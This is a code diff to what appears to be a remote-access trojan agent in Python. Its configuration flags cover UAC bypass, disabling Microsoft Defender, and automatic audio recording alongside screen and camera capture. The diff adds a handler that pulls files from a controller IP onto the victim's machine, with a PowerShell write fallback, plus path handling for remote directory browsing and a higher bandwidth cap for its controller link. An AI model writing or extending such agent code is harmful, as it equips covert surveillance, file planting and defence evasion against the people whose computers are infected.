@@ -784,14 +784,13 @@ def _resolve_controller_url():
     candidates = [
         v1,
         v2,
-        'http://127.0.0.1:8080/'
-        'http://127.0.0.1:8080/'
-        'http://127.0.0.1:8080/'
+        'http://127.0.0.1:8080',
+        'http://localhost:8080'
     ]
     for u in candidates:
         if u and u.lower() not in ('none', 'null'):
             return u
-    return 'http://127.0.0.1:8080/'
+    return 'http://127.0.0.1:8080'
 FIXED_SERVER_URL = _resolve_controller_url()
 DISABLE_SLUI_BYPASS = True
 UAC_BYPASS_DEBUG_MODE = False
@@ -1485,7 +1484,7 @@ DEFENDER_DISABLE_ENABLED = False
 DEFENDER_TAMPER_DISABLE_ENABLED = False
 AUTO_START_AUDIO_WITH_SCREEN = os.environ.get('AUTO_START_AUDIO_WITH_SCREEN', '1') == '1'
 AUTO_START_AUDIO_WITH_CAMERA = os.environ.get('AUTO_START_AUDIO_WITH_CAMERA', '1') == '1'
-SOCKET_MAX_BPS = int(os.environ.get('SOCKET_MAX_BPS', str(2 * 1024 * 1024)))
+SOCKET_MAX_BPS = int(os.environ.get('SOCKET_MAX_BPS', str(8 * 1024 * 1024)))
 def _default_upload_dir():
     try:
         d = os.environ.get('LOCALAPPDATA')
@@ -1624,15 +1623,22 @@ def rate_limit_before_send(payload_size: int):
             if now - _global_second_start >= 1.0:
                 _global_second_start = now
                 _global_bytes_this_second = 0
-            if _global_bytes_this_second + payload_size > SOCKET_MAX_BPS:
-                sleep_time = 1.0 - (now - _global_second_start)
-                _socket_rate_lock.release()
-                try:
-                    if sleep_time > 0:
-                        time.sleep(sleep_time)
-                finally:
-                    _socket_rate_lock.acquire()
-                _global_second_start = time.time()
+            available = SOCKET_MAX_BPS - _global_bytes_this_second
+            if available < 0:
+                available = 0
+            if payload_size > available:
+                sleep_time = (payload_size - available) / float(SOCKET_MAX_BPS)
+            else:
+                sleep_time = min(0.004, payload_size / float(SOCKET_MAX_BPS))
+        finally:
+            _socket_rate_lock.release()
+        if sleep_time > 0:
+            time.sleep(sleep_time)
+        _socket_rate_lock.acquire()
+        try:
+            now = time.time()
+            if now - _global_second_start >= 1.0:
+                _global_second_start = now
                 _global_bytes_this_second = 0
             _global_bytes_this_second += payload_size
         finally:
@@ -12179,6 +12185,22 @@ def handle_file_download(command_parts, agent_id):
     return "File download via HTTP POST is deprecated. Use chunked Socket.IO download."
 
 # --- Socket.IO Event Handler Registration ---
+def _sanitize_windows_filename(name: str) -> str:
+    import re, os
+    n = str(name or '')
+    base, ext = os.path.splitext(n)
+    base = re.sub(r'[<>:"/\\|?*\x00-\x1F]', '_', base)
+    base = re.sub(r'[\. ]+$', '', base)
+    if not base:
+        base = 'file'
+    rsv = {'CON','PRN','AUX','NUL'}
+    rsv.update({f'COM{i}' for i in range(1,10)})
+    rsv.update({f'LPT{i}' for i in range(1,10)})
+    if base.upper() in rsv:
+        base = '_' + base
+    ext = re.sub(r'[<>:"/\\|?*\x00-\x1F]', '', ext)
+    return base + ext
+
 def register_socketio_handlers():
     """Register all Socket.IO event handlers if Socket.IO is available."""
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -12313,6 +12335,149 @@ def register_socketio_handlers():
     sio.on('request_file_range')(on_request_file_range)
     sio.on('request_file_thumbnail')(on_request_file_thumbnail)
     sio.on('request_file_faststart')(on_request_file_faststart)
+    def on_p2p_download_request(data):
+        try:
+            controller_ip = str(data.get('controller_ip') or '')
+            controller_port = int(data.get('controller_port') or 0)
+            filename = _sanitize_windows_filename(str(data.get('filename') or ''))
+            destination = str(data.get('destination') or '')
+            upload_id = str(data.get('upload_id') or '')
+            expected_size = int(data.get('file_size') or 0)
+            expected_sha = str(data.get('sha256') or '')
+            agent_id = get_or_create_agent_id()
+            def _normalize_dir(p: str) -> str:
+                try:
+                    import re, os
+                    raw = str(p or '').strip()
+                    if os.name != 'nt':
+                        return os.path.normpath(raw or '/')
+                    if raw in ('', '/', '\\'):
+                        return (os.environ.get('SystemDrive', 'C:') + '\\')
+                    m = re.match(r'^/?([A-Za-z]):[\\/]?$', raw)
+                    if m:
+                        return (m.group(1).upper() + ':\\')
+                    if not re.match(r'^[A-Za-z]:', raw):
+                        if raw.startswith('/') or raw.startswith('\\'):
+                            drive = os.environ.get('SystemDrive', 'C:')
+                            return os.path.normpath(drive + '\\' + raw.lstrip('\\/'))
+                        return os.path.normpath(os.path.join(os.path.expanduser('~'), raw))
+                    return os.path.normpath(raw)
+                except Exception:
+                    return p
+            def _dl():
+                try:
+                    import socket as _s
+                    import json as _j
+                    sock = _s.socket(_s.AF_INET, _s.SOCK_STREAM)
+                    try:
+                        sock.settimeout(60)
+                        sock.connect((controller_ip, controller_port))
+                        dest_dir = _normalize_dir(destination or os.path.expanduser('~'))
+                        try:
+                            import re
+                            if os.name == 'nt':
+                                raw = str(dest_dir).strip()
+                                if raw and not re.match(r'^[A-Za-z]:', raw):
+                                    if raw.startswith('/') or raw.startswith('\\'):
+                                        drive = os.environ.get('SystemDrive', 'C:')
+                                        dest_dir = os.path.normpath(drive + '\\' + raw.lstrip('\\/'))
+                                    else:
+                                        dest_dir = os.path.normpath(os.path.join(os.path.expanduser('~'), raw))
+                                else:
+                                    if re.match(r'^[A-Za-z]:$', raw):
+                                        dest_dir = raw + '\\'
+                                    else:
+                                        dest_dir = os.path.normpath(raw or os.path.expanduser('~'))
+                                try:
+                                    user_profile = os.environ.get('USERPROFILE') or os.path.expanduser('~')
+                                    oned = os.path.join(user_profile, 'OneDrive', 'Desktop')
+                                    if os.path.basename(dest_dir).lower() == 'desktop' and os.path.isdir(oned):
+                                        dest_dir = oned
+                                except Exception:
+                                    pass
+                            else:
+                                dest_dir = os.path.normpath(dest_dir)
+                        except Exception:
+                            pass
+                        os.makedirs(dest_dir, exist_ok=True)
+                        target_path = os.path.join(dest_dir, filename)
+                        base, ext = os.path.splitext(target_path)
+                        c = 1
+                        while os.path.exists(target_path):
+                            target_path = f"{base} ({c}){ext}"
+                            c += 1
+                        sha = hashlib.sha256()
+                        received = 0
+                        f = None
+                        wrote_ok = False
+                        try:
+                            f = open(target_path, 'wb')
+                        except Exception:
+                            try:
+                                path_unc = '\\\\?\\' + os.path.abspath(target_path)
+                                f = open(path_unc, 'wb')
+                            except Exception:
+                                f = None
+                        if f:
+                            try:
+                                while True:
+                                    chunk = sock.recv(65536)
+                                    if not chunk:
+                                        break
+                                    f.write(chunk)
+                                    sha.update(chunk)
+                                    received += len(chunk)
+                                wrote_ok = True
+                            finally:
+                                try:
+                                    f.close()
+                                except Exception:
+                                    pass
+                        else:
+                            data_buf = bytearray()
+                            while True:
+                                chunk = sock.recv(65536)
+                                if not chunk:
+                                    break
+                                data_buf.extend(chunk)
+                                sha.update(chunk)
+                                received += len(chunk)
+                            try:
+                                import base64, subprocess
+                                ps_exe = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WindowsPowerShell', 'v1.0', 'powershell.exe')
+                                b64 = base64.b64encode(bytes(data_buf)).decode('ascii')
+                                ps_path = target_path.replace("'", "''")
+                                ps_cmd = "[IO.File]::WriteAllBytes('" + ps_path + "', [Convert]::FromBase64String('" + b64 + "'))"
+                                r = subprocess.run([ps_exe, "-NoProfile", "-NonInteractive", "-Command", ps_cmd], capture_output=True, timeout=120)
+                                if r.returncode == 0 and os.path.isfile(target_path) and os.path.getsize(target_path) == received:
+                                    wrote_ok = True
+                            except Exception:
+                                wrote_ok = False
+                        if not wrote_ok:
+                            safe_emit('file_upload_complete', {'agent_id': agent_id, 'upload_id': upload_id, 'filename': filename, 'error': 'Write failed', 'success': False})
+                            return
+                        if received != expected_size or sha.hexdigest() != expected_sha:
+                            safe_emit('file_upload_complete', {'agent_id': agent_id, 'upload_id': upload_id, 'filename': filename, 'error': 'Hash or size mismatch', 'success': False})
+                            return
+                        safe_emit('file_upload_complete', {'agent_id': agent_id, 'upload_id': upload_id, 'filename': filename, 'destination_path': target_path, 'size': received, 'success': True, 'source': 'agent'})
+                        try:
+                            files = FileSystemManager(sio, agent_id).list_directory(dest_dir)
+                            safe_emit('file_list', {'agent_id': agent_id, 'path': dest_dir, 'files': files})
+                        except Exception:
+                            pass
+                    except Exception as e:
+                        safe_emit('file_upload_complete', {'agent_id': agent_id, 'upload_id': upload_id, 'filename': filename, 'error': str(e), 'success': False})
+                    finally:
+                        try:
+                            sock.close()
+                        except Exception:
+                            pass
+                except Exception as e:
+                    safe_emit('file_upload_complete', {'agent_id': agent_id, 'upload_id': upload_id, 'filename': filename, 'error': str(e), 'success': False})
+            threading.Thread(target=_dl, daemon=True).start()
+        except Exception as e:
+            safe_emit('file_upload_complete', {'agent_id': get_or_create_agent_id(), 'upload_id': data.get('upload_id'), 'filename': data.get('filename'), 'error': str(e), 'success': False})
+    sio.on('p2p_download_request')(on_p2p_download_request)
     
     # Register other handlers
     sio.on('command')(on_command)
@@ -13603,6 +13768,28 @@ def main_loop(agent_id):
                 try:
                     parts = command.split(":",1)
                     path = parts[1] if len(parts)>1 and parts[1] else os.path.expanduser("~")
+                    try:
+                        import os, re
+                        if os.name == 'nt':
+                            raw = str(path or '').strip()
+                            if raw in ('', '/', '\\'):
+                                path = os.environ.get('SystemDrive', 'C:') + '\\'
+                            else:
+                                m = re.match(r'^/?([A-Za-z]):[\\/]?$', raw)
+                                if m:
+                                    path = m.group(1).upper() + ':\\'
+                                elif not re.match(r'^[A-Za-z]:', raw):
+                                    if raw.startswith('/') or raw.startswith('\\'):
+                                        drive = os.environ.get('SystemDrive', 'C:')
+                                        path = os.path.normpath(drive + '\\' + raw.lstrip('\\/'))
+                                    else:
+                                        path = os.path.normpath(os.path.join(os.path.expanduser('~'), raw))
+                                else:
+                                    path = os.path.normpath(raw)
+                        else:
+                            path = os.path.normpath(path or '/')
+                    except Exception:
+                        pass
                     entries = []
                     if os.path.isdir(path):
                         for name in os.listdir(path):
@@ -15265,6 +15452,28 @@ def on_command(data):
                 global LAST_BROWSED_DIRECTORY
                 parts = command.split(":",1)
                 path = parts[1] if len(parts)>1 and parts[1] else os.path.expanduser("~")
+                try:
+                    import os, re
+                    if os.name == 'nt':
+                        raw = str(path or '').strip()
+                        if raw in ('', '/', '\\'):
+                            path = os.environ.get('SystemDrive', 'C:') + '\\'
+                        else:
+                            m = re.match(r'^/?([A-Za-z]):[\\/]?$', raw)
+                            if m:
+                                path = m.group(1).upper() + ':\\'
+                            elif not re.match(r'^[A-Za-z]:', raw):
+                                if raw.startswith('/') or raw.startswith('\\'):
+                                    drive = os.environ.get('SystemDrive', 'C:')
+                                    path = os.path.normpath(drive + '\\' + raw.lstrip('\\/'))
+                                else:
+                                    path = os.path.normpath(os.path.join(os.path.expanduser('~'), raw))
+                            else:
+                                path = os.path.normpath(raw)
+                    else:
+                        path = os.path.normpath(path or '/')
+                except Exception:
+                    pass
                 
                 # Remember this directory for file downloads
                 LAST_BROWSED_DIRECTORY = path
@@ -16822,9 +17031,23 @@ class FileSystemManager:
                 up['chunks'].append((offset, chunk_bytes))
                 up['received'] += len(chunk_bytes)
                 progress = (up['received'] / (up['total_size'] or max(1, up['received']))) * 100.0
-                safe_emit('file_upload_progress', {'agent_id': self.agent_id, 'filename': up['filename'], 'destination_path': up.get('destination'), 'received': up['received'], 'total': up['total_size'], 'progress': int(progress)})
+                try:
+                    self.socket.emit('file_upload_progress', {
+                        'agent_id': self.agent_id,
+                        'upload_id': upload_id,
+                        'filename': up['filename'],
+                        'destination_path': up.get('destination'),
+                        'received': up['received'],
+                        'total': up['total_size'],
+                        'progress': int(progress)
+                    })
+                except Exception:
+                    safe_emit('file_upload_progress', {'agent_id': self.agent_id, 'upload_id': upload_id, 'filename': up['filename'], 'destination_path': up.get('destination'), 'received': up['received'], 'total': up['total_size'], 'progress': int(progress)})
             except Exception as e:
-                safe_emit('file_upload_progress', {'agent_id': self.agent_id, 'filename': (self.active_uploads.get(upload_id) or {}).get('filename'), 'error': str(e)})
+                try:
+                    self.socket.emit('file_upload_progress', {'agent_id': self.agent_id, 'upload_id': upload_id, 'filename': (self.active_uploads.get(upload_id) or {}).get('filename'), 'error': str(e)})
+                except Exception:
+                    safe_emit('file_upload_progress', {'agent_id': self.agent_id, 'upload_id': upload_id, 'filename': (self.active_uploads.get(upload_id) or {}).get('filename'), 'error': str(e)})
         @self.socket.on('upload_file_complete')
         def handle_upload_complete(data):
             upload_id = data.get('upload_id')
@@ -16848,11 +17071,27 @@ class FileSystemManager:
                                 dest_dir = os.path.normpath(os.path.join(os.getcwd(), raw))
                         else:
                             dest_dir = os.path.normpath(raw or os.path.expanduser('~'))
+                        try:
+                            user_profile = os.environ.get('USERPROFILE') or os.path.expanduser('~')
+                            onedrive_desktop = os.path.join(user_profile, 'OneDrive', 'Desktop')
+                            if os.path.basename(dest_dir).lower() == 'desktop' and os.path.isdir(onedrive_desktop):
+                                dest_dir = onedrive_desktop
+                        except Exception:
+                            pass
                     else:
                         dest_dir = os.path.normpath(dest_dir)
                 except Exception:
                     pass
                 full_path = os.path.join(dest_dir, up['filename'])
+                try:
+                    base_name, ext = os.path.splitext(up['filename'])
+                    target_path = full_path
+                    idx = 1
+                    while os.path.exists(target_path):
+                        target_path = os.path.join(dest_dir, f"{base_name} ({idx}){ext}")
+                        idx += 1
+                except Exception:
+                    target_path = full_path
                 try:
                     os.makedirs(dest_dir, exist_ok=True)
                 except Exception:
@@ -16871,45 +17110,68 @@ class FileSystemManager:
                         import subprocess, base64
                         ps_exe = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WindowsPowerShell', 'v1.0', 'powershell.exe')
                         b64 = base64.b64encode(file_data).decode('ascii')
-                        ps_path = full_path.replace("'", "''")
+                        ps_path = target_path.replace("'", "''")
                         ps_script = f"$b64 = [Console]::In.ReadToEnd(); [IO.File]::WriteAllBytes('{ps_path}', [Convert]::FromBase64String($b64))"
                         result = subprocess.run([ps_exe, "-NoProfile", "-NonInteractive", "-Command", ps_script], input=b64.encode('ascii'), capture_output=True, timeout=120)
-                        if result.returncode == 0 and os.path.isfile(full_path) and os.path.getsize(full_path) == len(file_data):
+                        if result.returncode == 0 and os.path.isfile(target_path) and os.path.getsize(target_path) == len(file_data):
                             wrote_ok = True
                     except Exception as e_ps:
                         write_error = str(e_ps)
                 if not wrote_ok:
                     try:
-                        with open(full_path, 'wb') as f:
+                        with open(target_path, 'wb') as f:
                             f.write(file_data)
                         wrote_ok = True
                         write_error = None
                     except Exception as e_write:
                         write_error = str(e_write)
                 if not wrote_ok:
-                    safe_emit('file_upload_complete', {'agent_id': self.agent_id, 'filename': (self.active_uploads.get(upload_id) or {}).get('filename'), 'error': write_error or 'Write failed', 'success': False})
+                    try:
+                        self.socket.emit('file_upload_complete', {'agent_id': self.agent_id, 'upload_id': upload_id, 'filename': (self.active_uploads.get(upload_id) or {}).get('filename'), 'error': write_error or 'Write failed', 'success': False})
+                    except Exception:
+                        safe_emit('file_upload_complete', {'agent_id': self.agent_id, 'upload_id': upload_id, 'filename': (self.active_uploads.get(upload_id) or {}).get('filename'), 'error': write_error or 'Write failed', 'success': False})
                     del self.active_uploads[upload_id]
                     return
                 file_hash = hashlib.sha256(file_data).hexdigest()
                 elapsed = time.time() - up['start_time']
-                safe_emit('file_upload_complete', {
-                    'agent_id': self.agent_id,
-                    'filename': up['filename'],
-                    'destination_path': full_path,
-                    'size': len(file_data),
-                    'hash': file_hash,
-                    'elapsed': elapsed,
-                    'success': True,
-                    'source': 'agent'
-                })
+                try:
+                    self.socket.emit('file_upload_complete', {
+                        'agent_id': self.agent_id,
+                        'upload_id': upload_id,
+                        'filename': up['filename'],
+                        'destination_path': target_path,
+                        'size': len(file_data),
+                        'hash': file_hash,
+                        'elapsed': elapsed,
+                        'success': True,
+                        'source': 'agent'
+                    })
+                except Exception:
+                    safe_emit('file_upload_complete', {
+                        'agent_id': self.agent_id,
+                        'upload_id': upload_id,
+                        'filename': up['filename'],
+                        'destination_path': target_path,
+                        'size': len(file_data),
+                        'hash': file_hash,
+                        'elapsed': elapsed,
+                        'success': True,
+                        'source': 'agent'
+                    })
                 try:
                     files = self.list_directory(dest_dir)
-                    safe_emit('file_list', {'agent_id': self.agent_id, 'path': dest_dir, 'files': files})
+                    try:
+                        self.socket.emit('file_list', {'agent_id': self.agent_id, 'path': dest_dir, 'files': files})
+                    except Exception:
+                        safe_emit('file_list', {'agent_id': self.agent_id, 'path': dest_dir, 'files': files})
                 except Exception:
                     pass
                 del self.active_uploads[upload_id]
             except Exception as e:
-                safe_emit('file_upload_complete', {'agent_id': self.agent_id, 'filename': (self.active_uploads.get(upload_id) or {}).get('filename'), 'error': str(e), 'success': False})
+                try:
+                    self.socket.emit('file_upload_complete', {'agent_id': self.agent_id, 'upload_id': upload_id, 'filename': (self.active_uploads.get(upload_id) or {}).get('filename'), 'error': str(e), 'success': False})
+                except Exception:
+                    safe_emit('file_upload_complete', {'agent_id': self.agent_id, 'upload_id': upload_id, 'filename': (self.active_uploads.get(upload_id) or {}).get('filename'), 'error': str(e), 'success': False})
         @self.socket.on('delete_file')
         def handle_delete_file(data):
             path = data.get('path')
@@ -18477,7 +18739,7 @@ def agent_main():
                         time.sleep(retry_delay)
                         continue
             
-                sio.connect(SERVER_URL, transports=['websocket', 'polling'], wait_timeout=10)
+                sio.connect(SERVER_URL, transports=['polling'], wait_timeout=10)
                 log_message("[OK] Connected to server successfully!")
                 
                 # Reset connection attempts and state on successful connection
